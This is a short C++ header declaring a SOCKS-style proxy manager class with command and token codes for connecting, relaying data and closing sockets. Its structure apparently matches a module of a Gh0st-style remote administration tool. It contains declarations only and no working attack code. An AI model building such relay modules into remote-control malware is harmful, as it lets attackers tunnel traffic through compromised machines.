#pragma once
#include "Manager.h"
#include <map> 
using namespace std;
enum
{
	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_BIND_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_CONNECT,
	COMMAND_PROXY_DATA,
	COMMAND_PROXY_CONNECT_HOSTNAME,
};


#define SAFE_TERMINATE(handle,times)  if (WaitForSingleObject(handle, times)!=WAIT_OBJECT_0) \
TerminateThread(handle, 0);


class CProxyManager : public CManager
{
public:
	BOOL m_buser;
	CProxyManager(ISocketBase* pClient);
	virtual ~CProxyManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	int Send(LPBYTE lpData, UINT nSize);
	void Disconnect(DWORD index);
	void SendConnectResult(LPBYTE lpBuffer, DWORD ip, USHORT port);
	static unsigned __stdcall SocksThread(LPVOID lparam);
	static unsigned __stdcall SocksThreadhostname(LPVOID lparam);
	DWORD	m_nSend;
	map<DWORD, SOCKET*> list;
	SOCKET* GetSocket(DWORD index,BOOL del=FALSE);
	CCriSec m_cs;
	int Threads;
};

struct SocksThreadArg
{
	CProxyManager* pThis;
	LPBYTE lpBuffer;
	int len;
};




